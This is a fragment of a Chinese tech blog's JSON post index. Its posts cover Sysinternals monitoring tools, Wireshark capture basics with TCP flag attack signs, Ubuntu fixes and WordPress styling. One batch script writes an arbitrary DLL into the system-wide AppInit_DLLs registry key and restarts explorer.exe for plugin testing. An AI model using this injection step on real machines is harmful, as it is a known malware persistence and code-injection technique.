至此,整个网站备份与恢复的过程就完成.建议大家在本地搭建一个php环境,本地先进行恢复实验,调试通过了再上传省去网络慢的烦恼.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"减少手工测试操作的简单批处理","slug":"easy-bat-for-dlltest","date":"2016-07-24T15:49:30.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"easy-bat-for-dlltest.html","permalink":"https://sobaigu.com/easy-bat-for-dlltest.html","excerpt":"我们摆弄软件,经常会碰到做各种测试,可能需要不停地修改文件,不停地注册重启导入等. 凑了个插件测试时用得着的小小批处理. 没技术含量,但可以稍微减少键盘操作频率.","text":"我们摆弄软件,经常会碰到做各种测试,可能需要不停地修改文件,不停地注册重启导入等. 凑了个插件测试时用得着的小小批处理. 没技术含量,但可以稍微减少键盘操作频率. 123456789101112131415161718192021222324252627282930@echo off:menuclsecho --------------------------------------------------echo 按1=注册BHO程序echo 按2=appinit方式加载程序echo --------------------------------------------------set /p choice= 请选择:IF NOT &quot;%choice%&quot;==&quot;&quot; SET choice=%choice:~0,1%if /i &quot;%choice%&quot;==&quot;1&quot; goto BHOif /i &quot;%choice%&quot;==&quot;2&quot; goto dll2explorer:BHOset /p bho=将需要加载的BHO拖入此窗口,然后回车:regsvr32 %bho%echo BHO注册完成pausegoto BHO:dll2explorerset /p dll=将需要加载的dll拖入此窗口,然后回车:REG ADD &quot;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot; /v AppInit_DLLs /t REG_EXPAND_SZ /d %dll% /frem appinit无法处理路径中含有空格,所以dll不要放置于桌面等带有空格的路径下rem 经常接触到加载至explorer.exe进程下的程序,测试时经常采用加appinit然后重启explorer,其他请自行扩展echo 按任意键重启explorer.exepausetaskkill /f /im explorer.exestart explorer.exegoto dll2explorer","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"有趣的软件_毛笔字生成工具","slug":"software-chinese-art-tool","date":"2016-07-10T15:49:21.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"software-chinese-art-tool.html","permalink":"https://sobaigu.com/software-chinese-art-tool.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：0.5 m 支持系统：Windows 官方主页： 软件介绍 很有趣的一款小工具，相信爱好书法的同学会喜欢。软件为绿色版本，小巧实用. 默认程序会开启两个书写窗口，实际上一个就够了，将另外一个最小化即可。 按住鼠标左键在空白区域写下你丑陋的字，然后右边调整各种参数，喜欢各种风格的自己调整，调整完点击变换就可以看到效果。 当然，你可以先选择字体，软件会自动仿照八大名家风格，同样，你还可以调整上面的各种参数，最后点变换，效果绝对好。 最终作品可以保存成软件专用格式下次继续编辑。也可以输出成图片。具体方法为点击菜单：文件&gt;输出，选择需要的输出格式保存即可。 程序预设了行书、草书、王羲之、怀素、徽宗、苏轼等十来种风格。使用的时候可以按需求调整下各种参数，最后效果不错，不知不觉咱都是书法大师了。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,链接不可点则表示无该地址下载或者对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 9aio","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"ProcessExplorer-ProcessMonitor-系统监控必备工具","slug":"software-procexp-and-procmon","date":"2016-06-26T15:48:56.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"software-procexp-and-procmon.html","permalink":"https://sobaigu.com/software-procexp-and-procmon.html","excerpt":"前言 经常用到SYSINTERNALS SOFTWARE的几个经典工具. 对软件行为监控首选SYSINTERNALS SOFTWARE出品的系列工具: regmon—可以监控系统注册表读写 filemon—用于监控文件读写 ProcessExplorer—用于监控进程以及进程关系 tcpview—监控进程监听端口，网络连接行为 鉴于以上软件功能上互有交集，SYSINTERNALS SOFTWARE收归微软后，以上工具除了ProcessExplorer和tcpview，文件和注册表监控工具都已不支持vista以上版本系统，取而代之的是集以上软件功能为一体的ProcessMonitor.","text":"前言 经常用到SYSINTERNALS SOFTWARE的几个经典工具. 对软件行为监控首选SYSINTERNALS SOFTWARE出品的系列工具: regmon—可以监控系统注册表读写 filemon—用于监控文件读写 ProcessExplorer—用于监控进程以及进程关系 tcpview—监控进程监听端口，网络连接行为 鉴于以上软件功能上互有交集，SYSINTERNALS SOFTWARE收归微软后，以上工具除了ProcessExplorer和tcpview，文件和注册表监控工具都已不支持vista以上版本系统，取而代之的是集以上软件功能为一体的ProcessMonitor. 今天就稍微详细点介绍下以上几个工具中的ProcessExplorer和ProcessMonitor 下载地址 每列提取码与链接对应，如为空表示直接点进去链接不需要提取码，无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 rtki ProcessExplorer ProcessExplorer这个工具如果经常折腾系统或者做软件调试的人应该接触较多. 相比Windows系统自带的任务管理器，其优秀之处在于很方便地查看进程相关信息，如进程路径，参数，线程等，还可以查看TCPIP连接，进程关系，占用情况等. 工具虽小，但作用很大，是一款软件爱好者必备利器. 查看进程相关信息 启动ProcessExplorer.exe后，我们可以在你需要查看的进程上右键&gt;属性查看，也可以直接双击或点击工具栏上方的手势按钮，打开后我们可以看到程序的路径，参数，线程等等信息，如图2所示: 此处我们可以查看一个进程的文件版本，加载线程，网络连接等各方面信息，其中有个比较有用的功能是校验程序的真伪. 我们知道目前网络上病毒猖狂，伪造的或者被人修改的系统文件比比皆是，在这么多文件里面我们根本难以区分哪些文件真正属于微软原版文件，指不定一个外表看上去微软得不能再微软的程序，实际上跟微软一点关系也没有，甚至是植入了恶意程序. 当一个程序签名是微软的信息，而实际上被注入第三方线程或者干脆非微软时，软件默认会以紫色醒目提示.同时，我们可以查看该进程属性，点击&quot;verify&quot;按钮，程序会自动与微软提供的程序符号表校对，如果确系微软文件，将会在版本信息处标识已校验通过. 反之，如果非微软的文件，则肯定无法与微软提供的符号表相匹配，软件将会提示无法验证.如果签名信息为微软，而又无法在此处通过验证，那么此时你就要多留意此文件的安全性了. 查看程序调用关系 一个程序往往由很多组件组成，程序通过各种调用关联完成一系列的功能.当然，现在的程序编写多采用标准库，查看到的也包含系统提供的相关模块. 我们可以点击工具栏上的面板按钮，也可以按快捷ctrl+l或者ctrl+d，一般多用ctrl+d，软件将自动展开程序的下级调用查看面板，我们选择一个程序，可以在下方看到相应的调用关系. 比如我要查看浏览器都加载了哪些插件，那么可以启动浏览器，然后选择浏览器进程，查看起调用的所有动态链接库.可能大部分都是微软的公司签名，那么我们可以点击公司名称标签排序，这样就可以快速地筛选出非微软的程序了.当然，纯粹公司名是可以任意伪造的，要验证真伪请参考前文. 在进程调用关系上，我们经常可以用于定位某些弹窗软件. 我们经常会发现右下角多出个小窗，小窗内播放着各种诱惑的东西，这种广告多如牛毛，还不知道是谁弹的，那么此功能就派上用场了. 左键点住工具栏上的雷达图标(一般是最后一个)，拖到弹出的小窗上再松开，程序自动定位到窗口程序，其程序间的父子关系一目了然，父进程就是罪魁祸首了，该怎么办您自己看着办. 做了个简单的示范录像，有兴趣的可以查看下，更多使用技巧请自己下载使用中体验 查找文件占用 其实是查看程序调用功能的延伸，本身程序能检查到各个文件之间的相互调用关系，那么就很好理解此功能的来源了. 我们平常可能会经常用到unlock这种工具删除被占用的文件，原理也类似，我们可以利用ProcessExplorer查找占用，然后将占用的程序结束掉再删文件，就不用装unlock了. 有一种程序一启动就会占用的文件，此时我们可以将进程结束，然后点击菜单&gt;file&gt;run/save等功能任意选一个，打开Windows的对话框，在此找到要删除的文件，右键能看到explorer下一样的菜单，将文件删除即可. ProcessMonitor 前面说过了，SYSINTERNALS SOFTWARE收归微软后，除了ProcessExplorer和tcpview，文件和注册表监控工具都已不支持vista以上版本系统，取而代之的是集文件，进程，注册表，网络监控功能为一体的ProcessMonitor. ProcessMonitor集成了: filemon和diskmon的文件读写监控功能 regmon的注册表读写监控功能 tcpview的网络连接监控功能 ProcessExplorer的进程监控功能 process monitor的界面延续了其集成软件的风格，菜单按钮基本一致，在最右侧提供了功能过滤区，当不需要某个监控功能时将其置于非按下状态，则不会在下方信息显示框中显示该功能信息. 展示区默认展示进程名，pid，操作项，路径，操作结果和相信信息显示，通过这些信息组合，我们可以知道一个程序到底做了什么. 这么个工具抓到的信息量是惊人的，每秒钟估计可以抓到系统中事件成百上千个，如果直接一个个去看，那么将是个难以想象的工程量. 对此，我们需要对抓到的信息进行过滤，最终只显示我们需要的信息. 点击菜单栏上的漏斗图标进入过滤设置菜单.在此我们可以设置过滤条件，点击上端下拉三角，选择我们要过滤的类别，包括公司名称，PID，进程名，路径等，后面继续选择表达式，规则包括等于，不等于，小于，大于等…在此不一一枚举 示例 以一实例示范. 需求:需要监控前面说的进程浏览器的行为. 分析:进程名称随文件名固定，默认为ProcessExplorer.exe 那么我们可以设定规律规则process name is ProcessExplorer.exe include就是上面选择规则添加后的结果，如果是排除不显示则选择exclude，添加完后为红叉显示.规则设定好后点击确定即开始了新规则过滤显示了，信息显示框只展示进程名为ProcessExplorer的监控信息. 可能我们只需要某个时刻的信息就行，那么你可以点击菜单栏上的搜索模样的图标停止捕捉. 也许过滤后我们看到的信息仍然很多，我们可以对已经过滤的信息再次进行过滤. 程序集成的四大功能我们可以首先进行过滤掉，如我只需要文件监控信息，那么将其他三个功能块都取消，则会只展示文件监控事件. 针对文件监控结果，你可以再次进入过滤规则设置那添加条件，也可以在选择的事件上右键设置过滤规则.如不需要关闭操作的事件，那么在关闭操作上右键&gt;排除关闭文件，那么对应的关闭操作都将不展示. 一系列过则过滤后，最终呈现的将是我们需要的信息，从这些信息中我们可以得知该程序做了什么操作，结果如何等. 右键设置规则对初学者来说十分有用，在哪右键就可以针对哪设置包含，排除，高亮等规则，具体可以自己进行尝试. 这里需要说明下，其实ProcessMonitor是将所有的时间都捕获，所以设置各种过滤规则只是显示的问题.由于捕获了大量的事件，时间久了可能出现机器卡的情况，请适时将时间做清除操作.当然，我们也可以将时间保存成文本，便于后续分析或者转交他人查看. 更多此类工具可见：Windows下几个很酷的安全维护工具","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Ubuntu开启3D效果出现白屏解决办法","slug":"ubuntu-3d-white-scr","date":"2016-06-12T15:49:31.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"ubuntu-3d-white-scr.html","permalink":"https://sobaigu.com/ubuntu-3d-white-scr.html","excerpt":"Ubuntu11.04之后改为了unity界面，可能是先入为主的缘故，整体没有gnome感觉好，或者说刚开始有较多东西不习惯。 也许你刚升级到unity桌面时也和我一样，忙着开启各种特效，尤其是那酷炫的3d效果。辛辛苦苦安装了ccsm，设置了compiz，启动了3d特效，结果unity消失，窗口标题边框消失，只剩下一个桌面，或者只剩一块白色区域。","text":"Ubuntu11.04之后改为了unity界面，可能是先入为主的缘故，整体没有gnome感觉好，或者说刚开始有较多东西不习惯。 也许你刚升级到unity桌面时也和我一样，忙着开启各种特效，尤其是那酷炫的3d效果。辛辛苦苦安装了ccsm，设置了compiz，启动了3d特效，结果unity消失，窗口标题边框消失，只剩下一个桌面，或者只剩一块白色区域。 辛苦白费的滋味做过了才知道，悔不该赶新潮当小白鼠。 你可以选择重装，但本人认为，既然装了，那就体验下也无妨。 不重装修复办法如下: 按ctrl+alt+f1进入字符界面，或ctrl+alt+t调出终端程序,执行命令： 1unity --reset 如果还不行就把compiz 卸载或把~/.config/compiz-1目录删除。 搞定再重启，系统恢复默认，应该能进入桌面环境了。 继续折腾吧！","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"代码高亮工具-Linux篇","slug":"highlight-tool-in-linux","date":"2016-06-07T14:33:58.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"highlight-tool-in-linux.html","permalink":"https://sobaigu.com/highlight-tool-in-linux.html","excerpt":"","text":"之前推荐过一个工具，高亮出来的内容比较满意，具体详见：代码高亮工具-Windows篇 但此工具只能在Windows下运行，有时候会进Linux系统，为了高亮些内容往往需要去找以前发布文章里的高亮代码，或者干脆重启机器进入Windows系统进行编排，长此以往难免觉得麻烦。 其实Linux下也有类似的工具，比如&quot;QSource-Highlight&quot;就是一款比较优秀的高亮工具，而且有比较人性化的界面，如右图所示。 本人使用的是Ubuntu系统，就以此为示范。安装很简单。 软件源中安装： 按super键，或winows徽标键，或鼠标点击左上角Ubuntu菜单图标（相当于Windows的开始菜单），输入soft，进入&quot;Ubuntu software center&quot;，搜索highlight，将可以找到QSource-Highlight这款软件，点击install安装即可。 终端方式安装： 1xxx@expired:~$ sudo apt-get install QSource-Highlight 安装完成后像启动其他软件一样启动QSource-Highlight，使用此工具可以定制自己需要的高亮风格，效果如上行终端安装命令所示。虽然与Windows下的CodeRenderUnmi有点差异，而且风格也有不同，但此工具的高亮可以直接在预览中复制，然后直接在可视化编辑器中粘贴，也算是满足了我们的简单需求，不介意的可以安装试下。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Ubuntu系统环境变量配置文件","slug":"linux-profiles","date":"2016-05-29T03:30:42.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"linux-profiles.html","permalink":"https://sobaigu.com/linux-profiles.html","excerpt":"Ubuntu Linux系统环境变量配置文件如下: 1/etc/profile 在登录时,操作系统定制用户环境时使用的第一个文件 ,此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。","text":"Ubuntu Linux系统环境变量配置文件如下: 1/etc/profile 在登录时,操作系统定制用户环境时使用的第一个文件 ,此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。 1/etc /environment 在登录时操作系统使用的第二个文件, 系统在读取你自己的profile前,设置环境文件的环境变量。 1~/.profile 在登录时用到的第三个文件 是.profile文件,每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。 在不同的Linux操作系统下，这个文件可能是不同的，可能是~/.bashprofile； ~/.bash_login或 ~/.profile其中的一种或几种，如果存在几种的话，那么执行的顺序便是：~/.bashprofile、 ~/.bashlogin、 ~/.profile。 1/etc/bashrc 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取. 1~/.bashrc 该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"WordPress 3D旋转标签云","slug":"3d-tags-for-wp","date":"2016-05-18T10:59:18.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"3d-tags-for-wp.html","permalink":"https://sobaigu.com/3d-tags-for-wp.html","excerpt":"","text":"这个3D标签云可不是N年前的那个Flash版的 wp-cumulus， 这个3D旋转标签云完全使用JS代码编写，很小只有几K，不用担心像垃圾Flash对资源的耗费。 下面以WordPress默认主题Twenty Fifteen为例，将这个炫酷的特效加到你的博客上。 添加生成3D效果的脚本 将下载的3d.js脚本放到Twenty Fifteen主题js目录中。 3d效果一下载 3d效果二下载 **注：**这个3D旋转标签云有两种效果的JS文件，我用的是第二种。 打开Twenty Fifteen主题 functions.php 模板文件，在大约252行，添加： 1wp_enqueue_script( &#x27;3d&#x27;, get_template_directory_uri() . &#x27;/js/3d.js&#x27; ); 或者直接将下面代码加到主题header模板 1&lt;script type=&quot;text/javascript&quot; src=&quot;&lt;?php bloginfo(&#x27;template_directory&#x27;); ?&gt;/js/3d.js&quot;&gt;&lt;/script&gt; 添加样式 将下面的样式添加到主题style.css的最后即可： 123456789101112131415161718192021222324252627282930313233343536373839#tag_cloud-2 &#123;position:relative;height:340px;margin: 10px auto 0;&#125;#tag_cloud-2 a &#123;position:absolute;color: #fff;text-align: center;text-overflow: ellipsis;whitewhite-space: nowrap;top:0px;left:0px;padding: 3px 5px;border: none;&#125;#tag_cloud-2 a:hover &#123;background: #d02f53;display: block;&#125;#tag_cloud-2 a:nth-child(n) &#123;background: #666;border-radius: 3px;display: inline-block;line-height: 18px;margin: 0 10px 15px 0;&#125;#tag_cloud-2 a:nth-child(2n) &#123;background: #d1a601;&#125;#tag_cloud-2 a:nth-child(3n) &#123;background: #286c4a;&#125;#tag_cloud-2 a:nth-child(5n) &#123;background: #518ab2;&#125;#tag_cloud-2 a:nth-child(4n) &#123;background: #c91d13;&#125; 修改对应选择器名称 比较麻烦点的是，其中 #tag_cloud-2 需根据不同情况加以修改，比如查看标签云小工具的网页源代码显示的是： 12&lt;aside id=&quot;tag_cloud-3&quot; class=&quot;widget widget_tag_cloud&quot;&gt;&lt;h2 class=&quot;widget-title&quot;&gt;标签&lt;/h2&gt; 你就需要将 #tag_cloud-2改为#tag_cloud-3，同时将3d.js中的tag_cloud-2也改为tag_cloud-3 这个3D旋转标签云本身是支持低版本IE的，不过本例中配套的样式使用了CSS3特效，所以在低版本IE上标签背影色会不显示。 JS源代码：来自互联网 文章转自:http://zmingcx.com/WordPress-3dcumulus.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"捣鼓软件之:网络抓包利器-wireshark","slug":"how-to-use-wireshark","date":"2016-05-15T15:49:00.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"how-to-use-wireshark.html","permalink":"https://sobaigu.com/how-to-use-wireshark.html","excerpt":"","text":"前言 摆弄软件，难免需要一些基础技能，对网络数据包及软件行为监控都需要一定的了解. 对软件行为监控首选SYSINTERNALS SOFTWARE出品的系列工具: regmon：可以监控系统注册表读写 filemon：用于监控文件读写 procexp：用于监控进程以及进程关系 tcpview：监控进程监听端口，网络连接行为 鉴于以上软件功能上互有交集，SYSINTERNALS SOFTWARE收归微软后，以上工具除了procexp和tcpview，文件和注册表监控工具都已不支持vista以上版本，系统取而代之的是集以上软件功能为一体的procmon，具体可以到微软网站下载，或者搜索引擎搜索即可下载到，具体用法自己打开软件看了就会了。 基本使用可在本站搜索: 系统监控必备工具 本次介绍搞网络或者网络相关软件人士必备基本技能:网络抓包。网络抓包可以在路由上进行，这个需要特殊硬件支持，一般路由或者交换机能看到的也只是个概况，基本上还是将所有数据流过滤，然后提取感兴趣的部分。 同类软件 常见抓包软件有: wireshark：顶尖的抓包工具，不同的是此软件开源，免费，而且有绿色版本。 sniffer pro：大名鼎鼎的老牌抓包工具，国内有不少破解版，可用的也就4.75版本吧，我这提供一个本人收藏版，可以点击超链接下载。 科来网络分析系统：国内还算做的比较好的吧，对咱来说主要是都汉化了，看得明白点，具体可以网上搜索，官方有比较多的使用资料。 还有一些诸如wirepark，netspy，SmartSniff 等都是比较优秀的抓包软件，在此就不一一列举了，今日重点推荐wireshark。 wireshark使用 此软件基于winpcap支持，安装完成无需重启即可使用。当然，官方也提供绿色版本，但绿色版本无法实现同时多窗口运行，所以推荐安装版。可能个别系统为了防止arp攻击做了免疫，导致winpcap无法正确安装，如wireshark提示错误请先下载Npptools.dll恢复到Windows目录即可 打开wireshark我们可以看到整个软件功能明了的界面，整个软件界面为标准的Windows软件排布，顶部将常用及主要功能按钮摆放一排。 wireshark开始使用之前可以将鼠标移至各按钮上看下其基本功能，使用之前也有必要了解下tcp-ip相关基础知识，根据具体用途及使用目的不同，也有必要对相关知识做相应的了解。 如想诊断局域网内arp攻击(随便举个例，诊断arp工具目前市面上有不少傻瓜工具，如WinArpAttacker这种集诊断与防御攻击于一身，关于WinArpAttacker可以参考本人另外一篇文章：局域网攻击神器:WinArpAttacker，那么就需要对arp相关流程有一定的了解，才能在众多的数据包中分析出哪些是正常的arp请求应答，哪些是恶意所为，其他如http等，在此不做讨论。 下面就以抓取网页访问行为为例实际操作示范 开始第一步:选择需要过滤的协议 点击工具栏左边第一或者第二个按钮，将打开设置界面。默认会直接将本机所有的网络适配器列出，点击start将直接开始抓取所有能够监听到的数据包，点击option将回到设置界面。 一般选择物理网卡，然后设置过滤规则(capture filter)。 本次要抓取的是网页访问行为，那么选择http tcp port(80)就可以了。当然，如果要抓取https协议，那么相应的 添加and tcp port 443。 实际上wireshark会将所有与已选的协议匹配的数据包保留，所以后期开始抓包后还可以再次选择需要过滤的协议。 设置好协议后就可以开始了，我们可以看到其中包含了在过滤规则内的所有的监听到的数据包，在数据量较大时，一个个数据包查看将是个巨大的工程，且对你的眼睛也是巨大的挑战。 针对此情况，我们有必要对已经过滤过的协议再次进行信息展示过滤。 我们可以看到界面上有个输入框，我们可以选择左边的filter按钮进入，这就是之前提过的可以再次选择过滤协议的地方。 对已经抓取到的数据，我们可以对输出信息再次筛选。如果对http协议或者行为有了解，那么你可以直接在输入框中输入需要过滤的信息，格式如http.request....，输入的过程中软件会相应的给出引导提示，最终完成自己需要过滤的信息，按右边的apply按钮应用过滤信息。 另外一种如图6所示，选择自己想要展示的信息，右边可以选择匹配或者包含等关系。 通过定制各种过滤规则，可以最大可能地过滤掉一些垃圾信息。当然，很多时候我们不知道自己需要什么信息，这个时候就不得不费神费力费眼睛去找了。 最终多个过滤条件用&quot;and&quot;连接。 以上为简单的使用介绍，更多细节还需要亲自使用才能有所发现。总之使用方法不难，难在抓到后的数据整理分析，从监听到的杂乱数据中发掘自己需要的部分。 本站空间不在墙内，速度不是很好，可能有同学看不到图片，保存了个pdf文件，点击下载:wireshark使用简介.pdf 必要知识补充 三次握手Three-way Handshake 一个虚拟连接的建立是通过三次握手来实现的 1(Client) –&gt; [SYN] –&gt; (Server) 假如Client和Server通讯。 当Client要和Server通信时，Client首先向Server发一个SYN (Synchronize) 标记的包，告诉Server请求建立连接。 注意: 一个 SYN包就是仅SYN标记设为1的TCP包(参见TCP包头Resources)。 认识到这点很重要，只有当Server收到Client发来的SYN包，才可建立连接，除此之外别无他法。因此，如果你的防火墙丢弃所有的发往外网接口的 SYN包，那么你将不 能让外部任何主机主动建立连接。 1(Client) &lt;– [SYN/ACK] &lt;–(Server) 接着，Server收到来自Client发来的SYN包后，会发一个对SYN包的确认包(SYN/ACK)给Client，表示对第一个SYN包的确认，并继续握手操作。 注意: SYN/ACK包是仅SYN 和 ACK 标记为1的包。 1(Client) –&gt; [ACK] –&gt; (Server) Client收到来自Server的SYN/ACK 包，Client会再向Server发一个确认包(ACK)，通知Server连接已建立。至此，三次握手完成，一个TCP连接完成。 Note: ACK包就是仅ACK 标记设为1的TCP包。 需要注意的是当三此握手完成、连接建立以后，TCP连接的每个包都会设置ACK位。 这就是为何连接跟踪很重要的原因了。 没有连接跟踪，防火墙将无法判断收到的ACK包是否属于一个已经建立的连接。一般的包过滤(Ipchains)收到ACK包时，会让它通过(这绝对不是个 好主意)。 而当状态型防火墙收到此种包时，它会先在连接表中查找是否属于哪个已建连接，否则丢弃该包。 四次握手Four-way Handshake 四次握手用来关闭已建立的TCP连接 (Client) –&gt; ACK/FIN –&gt; (Server) (Client) &lt;– ACK &lt;– (Server) (Client) &lt;– ACK/FIN &lt;– (Server) (Client) –&gt; ACK –&gt; (Server) 注意: 由于TCP连接是双向连接， 因此关闭连接需要在两个方向上做。ACK/FIN 包(ACK 和FIN 标记设为1)通常被认为是FIN(终结)包。然而， 由于连接还没有关闭， FIN包总是打上ACK标记。 没有ACK标记而仅有FIN标记的包不是合法的包，并且通常被认为是恶意的。 连接复位Resetting a connection 四次握手不是关闭TCP连接的唯一方法。 有时，如果主机需要尽快关闭连接(或连接超时，端口或主机不可达)，RST (Reset)包将被发送。 注意在，由于RST包不是TCP连接中的必须部分， 可以只发送RST包(即不带ACK标记)。 但在正常的TCP连接中RST包可以带ACK确认标记 请注意RST包是可以不要收到方确认的? 无效的TCP标记Invalid TCP Flags 到目前为止，你已经看到了 SYN， ACK， FIN， 和RST 标记。 另外，还有PSH (Push) 和URG (Urgent)标记。 最常见的非法组合是SYN/FIN 包。 注意:由于 SYN包是用来初始化连接的， 它不可能和 FIN和RST标记一起出现。 这也是一个恶意攻击。 由于现在大多数防火墙已知 SYN/FIN 包， 别的一些组合，例如SYN/FIN/PSH， SYN/FIN/RST， SYN/FIN/RST/PSH。很明显，当网络中出现这种包时，很你的网络肯定受到攻击了。 别的已知的非法包有FIN (无ACK标记)和”NULL”包。如同早先讨论的，由于ACK/FIN包的出现是为了关闭一个TCP连接，那么正常的FIN包总是带有 ACK 标记。”NULL”包就是没有任何TCP标记的包(URG，ACK，PSH，RST，SYN，FIN都为0)。 到目前为止，正常的网络活动下，TCP协议栈不可能产生带有上面提到的任何一种标记组合的TCP包。当你发现这些不正常的包时，肯定有人对你的网络不怀好意。 UDP (用户数据包协议User Datagram Protocol) TCP是面向连接的，而UDP是非连接的协议。UDP没有对接受进行确认的标记和确认机制。对丢包的处理是在应用层 来完成的。(or accidental arrival)。 此处需要重点注意的事情是：在正常情况下，当UDP包到达一个关闭的端口时，会返回一个UDP复位包。由于UDP是非面向连接的， 因此没有任何确认信息来确认包是否正确到达目的地。因此如果你的防火墙丢弃UDP包，它会开放所有的UDP端口(?)。 由于Internet上正常情况下一些包将被丢弃，甚至某些发往已关闭端口(非防火墙的)的UDP包将不会到达目的，它们将返回一个复位UDP包。 因为这个原因，UDP端口扫描总是不精确、不可靠的。 看起来大UDP包的碎片是常见的DOS (Denial of Service)攻击的常见形式 (这里有个DOS攻击的例子，http://grc.com/dos/grcdos.htm ). ICMP (网间控制消息协议Internet Control Message Protocol) 如同名字一样， ICMP用来在主机/路由器之间传递控制信息的协议。 ICMP包可以包含诊断信息(ping， traceroute - 注意目前unix系统中的traceroute用UDP包而不是ICMP)，错误信息(网络/主机/端口 不可达 network/host/port unreachable)， 信息(时间戳timestamp， 地址掩码address mask request， etc)，或控制信息 (source quench， redirect， etc) 。 你可以在http://www.iana.org/assignments/icmp-parameters 中找到ICMP包的类型。 尽管ICMP通常是无害的，还是有些类型的ICMP信息需要丢弃。 Redirect (5)， Alternate Host Address (6)， Router Advertisement (9) 能用来转发通讯。 Echo (8)， Timestamp (13) and Address Mask Request (17) 能用来分别判断主机是否起来，本地时间 和地址掩码。注意它们是和返回的信息类别有关的。 它们自己本身是不能被利用的，但它们泄露出的信息对攻击者是有用的。 ICMP消息有时也被用来作为DOS攻击的一部分(例如：洪水ping flood ping，死 ping ?呵呵，有趣 ping of death)?/p&gt; 包碎片注意A Note About Packet Fragmentation 如果一个包的大小超过了TCP的最大段长度MSS (Maximum Segment Size) 或MTU (Maximum Transmission Unit)，能够把此包发往目的的唯一方法是把此包分片。由于包分片是正常的，它可以被利用来做恶意的攻击。 因为分片的包的第一个分片包含一个包头，若没有包分片的重组功能，包过滤器不可能检测附加的包分片。典型的攻击Typical attacks involve in overlapping the packet data in which packet header is 典型的攻击Typical attacks involve in overlapping the packet data in which packet header isnormal until is it overwritten with different destination IP (or port) thereby bypassing firewall rules。包分片能作为 DOS 攻击的一部分，它可以crash older IP stacks 或涨死CPU连接能力。 Netfilter/Iptables中的连接跟踪代码能自动做分片重组。它仍有弱点，可能受到饱和连接攻击，可以把CPU资源耗光。 更多wireshark的规则，可以参考：http://openmaniak.com/cn/wireshark_filters.php 